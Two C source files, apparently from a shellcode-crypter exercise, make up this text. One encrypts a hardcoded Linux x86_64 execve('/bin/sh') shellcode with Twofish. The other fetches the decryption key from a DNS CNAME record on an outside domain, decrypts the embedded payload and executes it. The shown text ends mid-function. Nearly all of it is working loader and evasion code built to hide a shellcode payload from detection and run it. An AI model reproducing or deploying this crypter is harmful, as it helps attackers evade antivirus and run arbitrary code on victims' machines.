/*----- Crypter.c ----- */

/*
   Optimized Twofish C implementation by Drew Csillag: https://www.schneier.com/code/twofish-cpy.zip
   Partially re-written by Andre Lima (https://andrelima.info) to encrypt/decrypt variable length Linux x86_64 shellcode.

   compiler is gcc(egcs-2.91.66)
   flags are -O3 -fomit-frame-pointer -Wall
   Processor is 233Mhz Pentium II (Deschutes)
   OS is Linux 2.2.16
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "tables.h"
#define u32 unsigned int
#define BYTE unsigned char
#define RS_MOD 0x14D
#define RHO 0x01010101L

/*
   gcc is smart enough to convert these to roll instructions.  If you want
   to see for yourself, either do gcc -O3 -S, or change the |'s to +'s and
   see how slow things get (you lose about 30-50 clocks) :).
*/
#define ROL(x,n) (((x) << ((n) & 0x1F)) | ((x) >> (32-((n) & 0x1F))))
#define ROR(x,n) (((x) >> ((n) & 0x1F)) | ((x) << (32-((n) & 0x1F))))

#if BIG_ENDIAN == 1
#define BSWAP(x) (((ROR(x,8) & 0xFF00FF00) | (ROL(x,8) & 0x00FF00FF)))
#else
#define BSWAP(x) (x)
#endif

#define _b(x, N) (((x) >> (N*8)) & 0xFF)

/* just casting to byte (instead of masking with 0xFF saves *tons* of clocks
   (around 50) */
#define b0(x) ((BYTE)(x))
/* this saved 10 clocks */
#define b1(x) ((BYTE)((x) >> 8))
/* use byte cast here saves around 10 clocks */
#define b2(x) (BYTE)((x) >> 16)
/* don't need to mask since all bits are in lower 8 - byte cast here saves
   nothing, but hey, what the hell, it doesn't hurt any */
#define b3(x) (BYTE)((x) >> 24)

#define BYTEARRAY_TO_U32(r) ((r[0] << 24) ^ (r[1] << 16) ^ (r[2] << 8) ^ r[3])
#define BYTES_TO_U32(r0, r1, r2, r3) ((r0 << 24) ^ (r1 << 16) ^ (r2 << 8) ^ r3)

void printSubkeys(u32 K[40])
{
    int i;
    printf("round subkeys\n");
    for (i=0;i<40;i+=2)
	printf("%08X %08X\n", K[i], K[i+1]);
}

/*
   multiply two polynomials represented as u32's, actually called with BYTES,
   but since I'm not really going to too much work to optimize key setup (since
   raw encryption speed is what I'm after), big deal.
*/
u32 polyMult(u32 a, u32 b)
{
    u32 t=0;
    while (a)
    {
	/*printf("A=%X  B=%X  T=%X\n", a, b, t);*/
	if (a&1) t^=b;
	b <<= 1;
	a >>= 1;
    }
    return t;
}

/* take the polynomial t and return the t % modulus in GF(256) */
u32 gfMod(u32 t, u32 modulus)
{
    int i;
    u32 tt;

    modulus <<= 7;
    for (i = 0; i < 8; i++)
    {
	tt = t ^ modulus;
	if (tt < t) t = tt;
	modulus >>= 1;
    }
    return t;
}

/*multiply a and b and return the modulus */
#define gfMult(a, b, modulus) gfMod(polyMult(a, b), modulus)

/* return a u32 containing the result of multiplying the RS Code matrix
   by the sd matrix
*/
u32 RSMatrixMultiply(BYTE sd[8])
{
    int j, k;
    BYTE t;
    BYTE result[4];

    for (j = 0; j < 4; j++)
    {
	t = 0;
	for (k = 0; k < 8; k++)
	{
	    /*printf("t=%X  %X\n", t, gfMult(RS[j][k], sd[k], RS_MOD));*/
	    t ^= gfMult(RS[j][k], sd[k], RS_MOD);
	}
	result[3-j] = t;
    }
    return BYTEARRAY_TO_U32(result);
}

/* the Zero-keyed h function (used by the key setup routine) */
u32 h(u32 X, u32 L[4], int k)
{
    BYTE y0, y1, y2, y3;
    BYTE z0, z1, z2, z3;
    y0 = b0(X);
    y1 = b1(X);
    y2 = b2(X);
    y3 = b3(X);

    switch(k)
    {
	case 4:
	    y0 = Q1[y0] ^ b0(L[3]);
	    y1 = Q0[y1] ^ b1(L[3]);
	    y2 = Q0[y2] ^ b2(L[3]);
	    y3 = Q1[y3] ^ b3(L[3]);
	case 3:
	    y0 = Q1[y0] ^ b0(L[2]);
	    y1 = Q1[y1] ^ b1(L[2]);
	    y2 = Q0[y2] ^ b2(L[2]);
	    y3 = Q0[y3] ^ b3(L[2]);
	case 2:
	    y0 = Q1[  Q0 [ Q0[y0] ^ b0(L[1]) ] ^ b0(L[0]) ];
	    y1 = Q0[  Q0 [ Q1[y1] ^ b1(L[1]) ] ^ b1(L[0]) ];
	    y2 = Q1[  Q1 [ Q0[y2] ^ b2(L[1]) ] ^ b2(L[0]) ];
	    y3 = Q0[  Q1 [ Q1[y3] ^ b3(L[1]) ] ^ b3(L[0]) ];
    }

    /* inline the MDS matrix multiply */
    z0 = multEF[y0] ^ y1 ^         multEF[y2] ^ mult5B[y3];
    z1 = multEF[y0] ^ mult5B[y1] ^ y2 ^         multEF[y3];
    z2 = mult5B[y0] ^ multEF[y1] ^ multEF[y2] ^ y3;
    z3 = y0 ^         multEF[y1] ^ mult5B[y2] ^ mult5B[y3];

    return BYTES_TO_U32(z0, z1, z2, z3);
}

/* given the Sbox keys, create the fully keyed QF */
void fullKey(u32 L[4], int k, u32 QF[4][256])
{
    BYTE y0, y1, y2, y3;

    int i;

    /* for all input values to the Q permutations */
    for (i=0; i<256; i++)
    {
	/* run the Q permutations */
	y0 = i; y1=i; y2=i; y3=i;
	switch(k)
    	{
    	    case 4:
    		y0 = Q1[y0] ^ b0(L[3]);
    		y1 = Q0[y1] ^ b1(L[3]);
    		y2 = Q0[y2] ^ b2(L[3]);
    		y3 = Q1[y3] ^ b3(L[3]);
    	    case 3:
    		y0 = Q1[y0] ^ b0(L[2]);
    		y1 = Q1[y1] ^ b1(L[2]);
    		y2 = Q0[y2] ^ b2(L[2]);
    		y3 = Q0[y3] ^ b3(L[2]);
    	    case 2:
    		y0 = Q1[  Q0 [ Q0[y0] ^ b0(L[1]) ] ^ b0(L[0]) ];
    		y1 = Q0[  Q0 [ Q1[y1] ^ b1(L[1]) ] ^ b1(L[0]) ];
    		y2 = Q1[  Q1 [ Q0[y2] ^ b2(L[1]) ] ^ b2(L[0]) ];
    		y3 = Q0[  Q1 [ Q1[y3] ^ b3(L[1]) ] ^ b3(L[0]) ];
    	}

	/* now do the partial MDS matrix multiplies */
	QF[0][i] = ((multEF[y0] << 24)
		    | (multEF[y0] << 16)
		    | (mult5B[y0] << 8)
		    | y0);
	QF[1][i] = ((y1 << 24)
		    | (mult5B[y1] << 16)
		    | (multEF[y1] << 8)
		    | multEF[y1]);
	QF[2][i] = ((multEF[y2] << 24)
		    | (y2 << 16)
		    | (multEF[y2] << 8)
		    | mult5B[y2]);
	QF[3][i] = ((mult5B[y3] << 24)
		    | (multEF[y3] << 16)
		    | (y3 << 8)
		    | mult5B[y3]);
    }
}

/* fully keyed h (aka g) function */
#define fkh(X) (S[0][b0(X)]^S[1][b1(X)]^S[2][b2(X)]^S[3][b3(X)])

/* one encryption round */
#define ENC_ROUND(R0, R1, R2, R3, round) \
    T0 = fkh(R0); \
    T1 = fkh(ROL(R1, 8)); \
    R2 = ROR(R2 ^ (T1 + T0 + K[2*round+8]), 1); \
    R3 = ROL(R3, 1) ^ (2*T1 + T0 + K[2*round+9]);

inline void encrypt(u32 K[40], u32 S[4][256], BYTE PT[16])
{
    u32 R0, R1, R2, R3;
    u32 T0, T1;

    /* load/byteswap/whiten input */
    R3 = K[3] ^ BSWAP(((u32*)PT)[3]);
    R2 = K[2] ^ BSWAP(((u32*)PT)[2]);
    R1 = K[1] ^ BSWAP(((u32*)PT)[1]);
    R0 = K[0] ^ BSWAP(((u32*)PT)[0]);

    ENC_ROUND(R0, R1, R2, R3, 0);
    ENC_ROUND(R2, R3, R0, R1, 1);
    ENC_ROUND(R0, R1, R2, R3, 2);
    ENC_ROUND(R2, R3, R0, R1, 3);
    ENC_ROUND(R0, R1, R2, R3, 4);
    ENC_ROUND(R2, R3, R0, R1, 5);
    ENC_ROUND(R0, R1, R2, R3, 6);
    ENC_ROUND(R2, R3, R0, R1, 7);
    ENC_ROUND(R0, R1, R2, R3, 8);
    ENC_ROUND(R2, R3, R0, R1, 9);
    ENC_ROUND(R0, R1, R2, R3, 10);
    ENC_ROUND(R2, R3, R0, R1, 11);
    ENC_ROUND(R0, R1, R2, R3, 12);
    ENC_ROUND(R2, R3, R0, R1, 13);
    ENC_ROUND(R0, R1, R2, R3, 14);
    ENC_ROUND(R2, R3, R0, R1, 15);

    /* load/byteswap/whiten output */
    ((u32*)PT)[3] = BSWAP(R1 ^ K[7]);
    ((u32*)PT)[2] = BSWAP(R0 ^ K[6]);
    ((u32*)PT)[1] = BSWAP(R3 ^ K[5]);
    ((u32*)PT)[0] = BSWAP(R2 ^ K[4]);
}

/* one decryption round */
#define DEC_ROUND(R0, R1, R2, R3, round) \
    T0 = fkh(R0); \
    T1 = fkh(ROL(R1, 8)); \
    R2 = ROL(R2, 1) ^ (T0 + T1 + K[2*round+8]); \
    R3 = ROR(R3 ^ (T0 + 2*T1 + K[2*round+9]), 1);

inline void decrypt(u32 K[40], u32 S[4][256], BYTE PT[16])
{
    u32 T0, T1;
    u32 R0, R1, R2, R3;

    /* load/byteswap/whiten input */
    R3 = K[7] ^ BSWAP(((u32*)PT)[3]);
    R2 = K[6] ^ BSWAP(((u32*)PT)[2]);
    R1 = K[5] ^ BSWAP(((u32*)PT)[1]);
    R0 = K[4] ^ BSWAP(((u32*)PT)[0]);

    DEC_ROUND(R0, R1, R2, R3, 15);
    DEC_ROUND(R2, R3, R0, R1, 14);
    DEC_ROUND(R0, R1, R2, R3, 13);
    DEC_ROUND(R2, R3, R0, R1, 12);
    DEC_ROUND(R0, R1, R2, R3, 11);
    DEC_ROUND(R2, R3, R0, R1, 10);
    DEC_ROUND(R0, R1, R2, R3, 9);
    DEC_ROUND(R2, R3, R0, R1, 8);
    DEC_ROUND(R0, R1, R2, R3, 7);
    DEC_ROUND(R2, R3, R0, R1, 6);
    DEC_ROUND(R0, R1, R2, R3, 5);
    DEC_ROUND(R2, R3, R0, R1, 4);
    DEC_ROUND(R0, R1, R2, R3, 3);
    DEC_ROUND(R2, R3, R0, R1, 2);
    DEC_ROUND(R0, R1, R2, R3, 1);
    DEC_ROUND(R2, R3, R0, R1, 0);

    /* load/byteswap/whiten output */
    ((u32*)PT)[3] = BSWAP(R1 ^ K[3]);
    ((u32*)PT)[2] = BSWAP(R0 ^ K[2]);
    ((u32*)PT)[1] = BSWAP(R3 ^ K[1]);
    ((u32*)PT)[0] = BSWAP(R2 ^ K[0]);

}

/* the key schedule routine */
void keySched(BYTE M[], int N, u32 **S, u32 K[40], int *k)
{
    u32 Mo[4], Me[4];
    int i, j;
    BYTE vector[8];
    u32 A, B;

    *k = (N + 63) / 64;
    *S = (u32*)malloc(sizeof(u32) * (*k));

    for (i = 0; i < *k; i++)
    {
	Me[i] = BSWAP(((u32*)M)[2*i]);
	Mo[i] = BSWAP(((u32*)M)[2*i+1]);
    }

    for (i = 0; i < *k; i++)
    {
	for (j = 0; j < 4; j++) vector[j] = _b(Me[i], j);
	for (j = 0; j < 4; j++) vector[j+4] = _b(Mo[i], j);
	(*S)[(*k)-i-1] = RSMatrixMultiply(vector);
    }
    for (i = 0; i < 20; i++)
    {
	A = h(2*i*RHO, Me, *k);
	B = ROL(h(2*i*RHO + RHO, Mo, *k), 8);
	K[2*i] = A+B;
	K[2*i+1] = ROL(A + 2*B, 9);
    }
}

void printHex(BYTE b[], int lim)
{
    int i;
    for (i=0; i<lim;i++)
	printf("\\x%02X", (u32)b[i]);
}

char* gen_rdm_bytestream (size_t num_bytes) {
    char *stream = malloc (num_bytes);
    for (size_t i = 0; i < num_bytes; i++)
        stream[i] = rand();
    return stream;
}

int main(int argc, char **argv)
{
    u32 *S;
    u32 K[40];
    int k;
    u32 QF[4][256];
    BYTE plaintext[16]; // single 128bit block
    BYTE key[32];
    int sh_bytes_left;
    int key_len = strlen(argv[1]);
    BYTE shellcode[] = \
        "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05";
    int shellcode_len = strlen((char*)shellcode);

    memset(key, 0, 32);
    memcpy(key, argv[1], key_len);
    keySched(key, 128, &S, K, &k);
    fullKey(S, k, QF);
    free(S);
    int i=0;
    int j=16;
    srand(time(NULL));
    printf("\nTwofish encrypted shellcode:\n");
    while (i < shellcode_len) {
        memcpy(plaintext, gen_rdm_bytestream(16), 16); // this will make it so the padding bytes are random, and hence more secure.
        if (j <= shellcode_len) {
            memcpy(plaintext, &shellcode[i], 16);
            i=j; j+= 16;
        }else {
            sh_bytes_left = shellcode_len%16;
            memcpy(plaintext, &shellcode[i],sh_bytes_left);
            i=j;
        }
        //printf("before-->"); printHex(plaintext, 16); printf("\n");
        encrypt(K, QF, plaintext);
        //printf("after--->"); printHex(plaintext, 16); printf("\n");
        printHex(plaintext, 16);
    }
    printf("\n\n");
    return 0;
}
/*----- Crypter.c ----- */

/*----- Decrypter.c ----- */
/*
   Optimized Twofish C implementation by Drew Csillag: https://www.schneier.com/code/twofish-cpy.zip
   Partially re-written by Andre Lima (https://andrelima.info) to encrypt/decrypt variable length Linux x86_64 shellcode.

   compiler is gcc(egcs-2.91.66)
   flags are -O3 -fomit-frame-pointer -Wall
   Processor is 233Mhz Pentium II (Deschutes)
   OS is Linux 2.2.16
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tables.h"
#include <sys/socket.h>  //you know what this is for
#include <arpa/inet.h>   //inet_addr , inet_ntoa , ntohs etc
#include <netinet/in.h>
#include <unistd.h>      //getpid
#define u32 unsigned int
#define BYTE unsigned char
#define RS_MOD 0x14D
#define RHO 0x01010101L

#define ROL(x,n) (((x) << ((n) & 0x1F)) | ((x) >> (32-((n) & 0x1F))))
#define ROR(x,n) (((x) >> ((n) & 0x1F)) | ((x) << (32-((n) & 0x1F))))

#if BIG_ENDIAN == 1
#define BSWAP(x) (((ROR(x,8) & 0xFF00FF00) | (ROL(x,8) & 0x00FF00FF)))
#else
#define BSWAP(x) (x)
#endif

#define _b(x, N) (((x) >> (N*8)) & 0xFF)

/* just casting to byte (instead of masking with 0xFF saves *tons* of clocks
   (around 50) */
#define b0(x) ((BYTE)(x))
/* this saved 10 clocks */
#define b1(x) ((BYTE)((x) >> 8))
/* use byte cast here saves around 10 clocks */
#define b2(x) (BYTE)((x) >> 16)
/* don't need to mask since all bits are in lower 8 - byte cast here saves
   nothing, but hey, what the hell, it doesn't hurt any */
#define b3(x) (BYTE)((x) >> 24)

#define BYTEARRAY_TO_U32(r) ((r[0] << 24) ^ (r[1] << 16) ^ (r[2] << 8) ^ r[3])
#define BYTES_TO_U32(r0, r1, r2, r3) ((r0 << 24) ^ (r1 << 16) ^ (r2 << 8) ^ r3)

void printSubkeys(u32 K[40])
{
    int i;
    printf("round subkeys\n");
    for (i=0;i<40;i+=2)
	printf("%08X %08X\n", K[i], K[i+1]);
}

/*
   multiply two polynomials represented as u32's, actually called with BYTES,
   but since I'm not really going to too much work to optimize key setup (since
   raw encryption speed is what I'm after), big deal.
*/
u32 polyMult(u32 a, u32 b)
{
    u32 t=0;
    while (a)
    {
	/*printf("A=%X  B=%X  T=%X\n", a, b, t);*/
	if (a&1) t^=b;
	b <<= 1;
	a >>= 1;
    }
    return t;
}

/* take the polynomial t and return the t % modulus in GF(256) */
u32 gfMod(u32 t, u32 modulus)
{
    int i;
    u32 tt;

    modulus <<= 7;
    for (i = 0; i < 8; i++)
    {
	tt = t ^ modulus;
	if (tt < t) t = tt;
	modulus >>= 1;
    }
    return t;
}

/*multiply a and b and return the modulus */
#define gfMult(a, b, modulus) gfMod(polyMult(a, b), modulus)

/* return a u32 containing the result of multiplying the RS Code matrix
   by the sd matrix
*/
u32 RSMatrixMultiply(BYTE sd[8])
{
    int j, k;
    BYTE t;
    BYTE result[4];

    for (j = 0; j < 4; j++)
    {
	t = 0;
	for (k = 0; k < 8; k++)
	{
	    /*printf("t=%X  %X\n", t, gfMult(RS[j][k], sd[k], RS_MOD));*/
	    t ^= gfMult(RS[j][k], sd[k], RS_MOD);
	}
	result[3-j] = t;
    }
    return BYTEARRAY_TO_U32(result);
}

/* the Zero-keyed h function (used by the key setup routine) */
u32 h(u32 X, u32 L[4], int k)
{
    BYTE y0, y1, y2, y3;
    BYTE z0, z1, z2, z3;
    y0 = b0(X);
    y1 = b1(X);
    y2 = b2(X);
    y3 = b3(X);

    switch(k)
    {
	case 4:
	    y0 = Q1[y0] ^ b0(L[3]);
	    y1 = Q0[y1] ^ b1(L[3]);
	    y2 = Q0[y2] ^ b2(L[3]);
	    y3 = Q1[y3] ^ b3(L[3]);
	case 3:
	    y0 = Q1[y0] ^ b0(L[2]);
	    y1 = Q1[y1] ^ b1(L[2]);
	    y2 = Q0[y2] ^ b2(L[2]);
	    y3 = Q0[y3] ^ b3(L[2]);
	case 2:
	    y0 = Q1[  Q0 [ Q0[y0] ^ b0(L[1]) ] ^ b0(L[0]) ];
	    y1 = Q0[  Q0 [ Q1[y1] ^ b1(L[1]) ] ^ b1(L[0]) ];
	    y2 = Q1[  Q1 [ Q0[y2] ^ b2(L[1]) ] ^ b2(L[0]) ];
	    y3 = Q0[  Q1 [ Q1[y3] ^ b3(L[1]) ] ^ b3(L[0]) ];
    }

    /* inline the MDS matrix multiply */
    z0 = multEF[y0] ^ y1 ^         multEF[y2] ^ mult5B[y3];
    z1 = multEF[y0] ^ mult5B[y1] ^ y2 ^         multEF[y3];
    z2 = mult5B[y0] ^ multEF[y1] ^ multEF[y2] ^ y3;
    z3 = y0 ^         multEF[y1] ^ mult5B[y2] ^ mult5B[y3];

    return BYTES_TO_U32(z0, z1, z2, z3);
}

/* given the Sbox keys, create the fully keyed QF */
void fullKey(u32 L[4], int k, u32 QF[4][256])
{
    BYTE y0, y1, y2, y3;

    int i;

    /* for all input values to the Q permutations */
    for (i=0; i<256; i++)
    {
	/* run the Q permutations */
	y0 = i; y1=i; y2=i; y3=i;
	switch(k)
    	{
    	    case 4:
    		y0 = Q1[y0] ^ b0(L[3]);
    		y1 = Q0[y1] ^ b1(L[3]);
    		y2 = Q0[y2] ^ b2(L[3]);
    		y3 = Q1[y3] ^ b3(L[3]);
    	    case 3:
    		y0 = Q1[y0] ^ b0(L[2]);
    		y1 = Q1[y1] ^ b1(L[2]);
    		y2 = Q0[y2] ^ b2(L[2]);
    		y3 = Q0[y3] ^ b3(L[2]);
    	    case 2:
    		y0 = Q1[  Q0 [ Q0[y0] ^ b0(L[1]) ] ^ b0(L[0]) ];
    		y1 = Q0[  Q0 [ Q1[y1] ^ b1(L[1]) ] ^ b1(L[0]) ];
    		y2 = Q1[  Q1 [ Q0[y2] ^ b2(L[1]) ] ^ b2(L[0]) ];
    		y3 = Q0[  Q1 [ Q1[y3] ^ b3(L[1]) ] ^ b3(L[0]) ];
    	}

	/* now do the partial MDS matrix multiplies */
	QF[0][i] = ((multEF[y0] << 24)
		    | (multEF[y0] << 16)
		    | (mult5B[y0] << 8)
		    | y0);
	QF[1][i] = ((y1 << 24)
		    | (mult5B[y1] << 16)
		    | (multEF[y1] << 8)
		    | multEF[y1]);
	QF[2][i] = ((multEF[y2] << 24)
		    | (y2 << 16)
		    | (multEF[y2] << 8)
		    | mult5B[y2]);
	QF[3][i] = ((mult5B[y3] << 24)
		    | (multEF[y3] << 16)
		    | (y3 << 8)
		    | mult5B[y3]);
    }
}

/* fully keyed h (aka g) function */
#define fkh(X) (S[0][b0(X)]^S[1][b1(X)]^S[2][b2(X)]^S[3][b3(X)])

/* one decryption round */
#define DEC_ROUND(R0, R1, R2, R3, round) \
    T0 = fkh(R0); \
    T1 = fkh(ROL(R1, 8)); \
    R2 = ROL(R2, 1) ^ (T0 + T1 + K[2*round+8]); \
    R3 = ROR(R3 ^ (T0 + 2*T1 + K[2*round+9]), 1);

inline void decrypt(u32 K[40], u32 S[4][256], BYTE PT[16])
{
    u32 T0, T1;
    u32 R0, R1, R2, R3;

    /* load/byteswap/whiten input */
    R3 = K[7] ^ BSWAP(((u32*)PT)[3]);
    R2 = K[6] ^ BSWAP(((u32*)PT)[2]);
    R1 = K[5] ^ BSWAP(((u32*)PT)[1]);
    R0 = K[4] ^ BSWAP(((u32*)PT)[0]);

    DEC_ROUND(R0, R1, R2, R3, 15);
    DEC_ROUND(R2, R3, R0, R1, 14);
    DEC_ROUND(R0, R1, R2, R3, 13);
    DEC_ROUND(R2, R3, R0, R1, 12);
    DEC_ROUND(R0, R1, R2, R3, 11);
    DEC_ROUND(R2, R3, R0, R1, 10);
    DEC_ROUND(R0, R1, R2, R3, 9);
    DEC_ROUND(R2, R3, R0, R1, 8);
    DEC_ROUND(R0, R1, R2, R3, 7);
    DEC_ROUND(R2, R3, R0, R1, 6);
    DEC_ROUND(R0, R1, R2, R3, 5);
    DEC_ROUND(R2, R3, R0, R1, 4);
    DEC_ROUND(R0, R1, R2, R3, 3);
    DEC_ROUND(R2, R3, R0, R1, 2);
    DEC_ROUND(R0, R1, R2, R3, 1);
    DEC_ROUND(R2, R3, R0, R1, 0);

    /* load/byteswap/whiten output */
    ((u32*)PT)[3] = BSWAP(R1 ^ K[3]);
    ((u32*)PT)[2] = BSWAP(R0 ^ K[2]);
    ((u32*)PT)[1] = BSWAP(R3 ^ K[1]);
    ((u32*)PT)[0] = BSWAP(R2 ^ K[0]);

}

/* the key schedule routine */
void keySched(BYTE M[], int N, u32 **S, u32 K[40], int *k)
{
    u32 Mo[4], Me[4];
    int i, j;
    BYTE vector[8];
    u32 A, B;

    *k = (N + 63) / 64;
    *S = (u32*)malloc(sizeof(u32) * (*k));

    for (i = 0; i < *k; i++)
    {
	Me[i] = BSWAP(((u32*)M)[2*i]);
	Mo[i] = BSWAP(((u32*)M)[2*i+1]);
    }

    for (i = 0; i < *k; i++)
    {
	for (j = 0; j < 4; j++) vector[j] = _b(Me[i], j);
	for (j = 0; j < 4; j++) vector[j+4] = _b(Mo[i], j);
	(*S)[(*k)-i-1] = RSMatrixMultiply(vector);
    }
    for (i = 0; i < 20; i++)
    {
	A = h(2*i*RHO, Me, *k);
	B = ROL(h(2*i*RHO + RHO, Mo, *k), 8);
	K[2*i] = A+B;
	K[2*i+1] = ROL(A + 2*B, 9);
    }
}

void printHex(BYTE b[], int lim)
{
    int i;
    for (i=0; i<lim;i++)
	printf("%02X", (u32)b[i]);
}


/*

Code altered from Silver Moon (m00n.silv3r@gmail.com)
- http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/

*/

//DNS server
char* dns_server = "8.8.8.8";

//hostname which CNAME register will return the password for the decrypter
char hostname[100];

//Types of DNS resource records:

#define T_A 1 //Ipv4 address
#define T_NS 2 //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6 /* start of authority zone */
#define T_PTR 12 /* domain name pointer */
#define T_MX 15 //Mail server

//Function Prototypes
char* ngethostbyname (unsigned char* , int);
void ChangetoDnsNameFormat (unsigned char*,unsigned char*);
unsigned char* ReadName (unsigned char*,unsigned char*,int*);

//DNS header structure
struct DNS_HEADER
{
    unsigned short id; // identification number

    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag

    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available

    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};

//Constant sized fields of query structure
struct QUESTION
{
    unsigned short qtype;
    unsigned short qclass;
};

//Constant sized fields of the resource record structure
#pragma pack(push, 1)
struct R_DATA
{
    unsigned short type;
    unsigned short _class;
    unsigned int ttl;
    unsigned short data_len;
};
#pragma pack(pop)

//Pointers to resource record contents
struct RES_RECORD
{
    unsigned char *name;
    struct R_DATA *resource;
    unsigned char *rdata;
};

//Structure of a Query
typedef struct
{
    unsigned char *name;
    struct QUESTION *ques;
} QUERY;

int main(int argc, char **argv)
{
    char* password;
    strcpy(hostname , "password.andrelima.info");
    password = ngethostbyname((unsigned char*)hostname , T_CNAME);
    char* firstDot = strchr(password,'.');
    *firstDot = (char)0;
    printf("\nRetrieved password is: %s\n\n",password);

    u32 *S;
    u32 K[40];
    int k;
    u32 QF[4][256];
    BYTE plaintext[16]; // single 128bit block
    BYTE key[32];
    // int key_len = strlen(argv[1]);
    int key_len = strlen(password);
    BYTE shellcode[] = \
        "\x55\x9B\x2B\x3A\x9E\x73\x23\xCE\xC5\x7B\x61\xDC\x97\x40\x29\xC9\x83\x49\x59\x5E\xE7\x28\x9B\x46\x79\xB2\x8E\x73\x04\x64\x11\x54";
    int shellcode_len = strlen((char*)shellcode);
    int (*ret)() = (int(*)())shellcode;

    memset(key, 0, 32);
    //memcpy(key, argv[1], key_len);
    memcpy(key, password, key_len);
    keySched(key, 128, &S, K, &k);
    fullKey(S, k, QF);
    free(S);
    int i=0;
    while (i < shellcode_len) {
        memcpy(plaintext, &shellcode[i], 16);
        //printf("before-->"); printHex(plaintext, 16); printf("\n");
        decrypt(K, QF, plaintext);
        //printf("after--->"); printHex(plaintext, 16); printf("\n");
	    printHex(plaintext, 16);
        memcpy(&shellcode[i], plaintext, 16);
        i += 16;
    }
    printf("\n");
    ret();
    return 0;
}

/*
 * Perform a DNS query by sending a packet
 * */
char* ngethostbyname(unsigned char *host , int query_type)
{
    unsigned char buf[65536],*qname,*reader;
    int i , j , stop , s;
    char* password; password = NULL;

    struct sockaddr_in a;

    struct RES_RECORD answers[20],auth[20],addit[20]; //the replies from the DNS server
    struct sockaddr_in dest;

    struct DNS_HEADER *dns = NULL;
    struct QUESTION *qinfo = NULL;

    printf("\nResolving %s" , host);

    s = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP); //UDP packet for DNS queries

    dest.sin_family = AF_INET;
    dest.sin_port = htons(53);
    dest.sin_addr.s_addr = inet_addr(dns_server); //dns servers

    //Set the DNS structure to standard queries
    dns = (struct DNS_HEADER *)&buf;

    dns->id = (unsigned short) htons(getpid());
    dns->qr = 0; //This is a query
    dns->opcode = 0; //This is a standard query
    dns->aa = 0; //Not Authoritative
    dns->tc = 0; //This message is not truncated
    dns->rd = 1; //Recursion Desired
    dns->ra = 0; //Recursion not available! hey we dont have it (lol)
    dns->z = 0;
    dns->ad = 0;
    dns->cd = 0;
    dns->rcode = 0;
    dns->q_count = htons(1); //we have only 1 question
    dns->ans_count = 0;
    dns->auth_count = 0;
    dns->add_count = 0;

    //point to the query portion
    qname =(unsigned char*)&buf[sizeof(struct DNS_HEADER)];

    ChangetoDnsNameFormat(qname , host);
    qinfo =(struct QUESTION*)&buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname) + 1)]; //fill it

    qinfo->qtype = htons( query_type ); //type of the query , A , MX , CNAME , NS etc
    qinfo->qclass = htons(1); //its internet (lol)

    printf("\nSending Packet...");
    if( sendto(s,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&dest,sizeof(dest)) < 0)
    {
        perror("sendto failed");
    }
    printf("Done");

    //Receive the answer
    i = sizeof dest;
    printf("\nReceiving answer...");
    if(recvfrom (s,(char*)buf , 65536 , 0 , (struct sockaddr*)&dest , (socklen_t*)&i ) < 0)
    {
        perror("recvfrom failed");
    }
    printf("Done");

    dns = (struct DNS_HEADER*) buf;

    //move ahead of the dns header and the query field
    reader = &buf[sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION)];

    printf("\nThe response contains : ");
    printf("\n %d Questions.",ntohs(dns->q_count));
    printf("\n %d Answers.",ntohs(dns->ans_count));
    printf("\n %d Authoritative Servers.",ntohs(dns->auth_count));
    printf("\n %d Additional records.\n\n",ntohs(dns->add_count));

    //Start reading answers
    stop=0;

    for(i=0;i<ntohs(dns->ans_count);i++)
    {
        answers[i].name=ReadName(reader,buf,&stop);
        reader = reader + stop;

        answers[i].resource = (struct R_DATA*)(reader);
        reader = reader + sizeof(struct R_DATA);

        if(ntohs(answers[i].resource->type) == 1) //if its an ipv4 address
        {
            answers[i].rdata = (unsigned char*)malloc(ntohs(answers[i].resource->data_len));

            for(j=0 ; j<ntohs(answers[i].resource->data_len) ; j++)
            {
                answers[i].rdata[j]=reader[j];
            }

            answers[i].rdata[ntohs(answers[i].resource->data_len)] = '\0';

            reader = reader + ntohs(answers[i].resource->data_len);
        }
        else
        {
            answers[i].rdata = ReadName(reader,buf,&stop);
            reader = reader + stop;
        }
    }

    //read authorities
    for(i=0;i<ntohs(dns->auth_count);i++)
    {
        auth[i].name=ReadName(reader,buf,&stop);
        reader+=stop;

        auth[i].resource=(struct R_DATA*)(reader);
        reader+=sizeof(struct R_DATA);

        auth[i].rdata=ReadName(reader,buf,&stop);
        reader+=stop;
    }

    //read additional
    for(i=0;i<ntohs(dns->add_count);i++)
    {
        addit[i].name=ReadName(reader,buf,&stop);
        reader+=stop;

        addit[i].resource=(struct R_DATA*)(reader);
        reader+=sizeof(struct R_DATA);

        if(ntohs(addit[i].resource->type)==1)
        {
            addit[i].rdata = (unsigned char*)malloc(ntohs(addit[i].resource->data_len));
            for(j=0;j<ntohs(addit[i].resource->data_len);j++)
            addit[i].rdata[j]=reader[j];

            addit[i].rdata[ntohs(addit[i].resource->data_len)]='\0';
            reader+=ntohs(addit[i].resource->data_len);
        }
        else
        {
            addit[i].rdata=ReadName(reader,buf,&stop);
            reader+=stop;
        }
    }

    //print answers
    printf("Answer Records : %d \n" , ntohs(dns->ans_count) );
    for(i=0 ; i < ntohs(dns->ans_count) ; i++)
    {
        printf("Name : %s ",answers[i].name);

        if( ntohs(answers[i].resource->type) == T_A) //IPv4 address
        {
            long *p;
            p=(long*)answers[i].rdata;
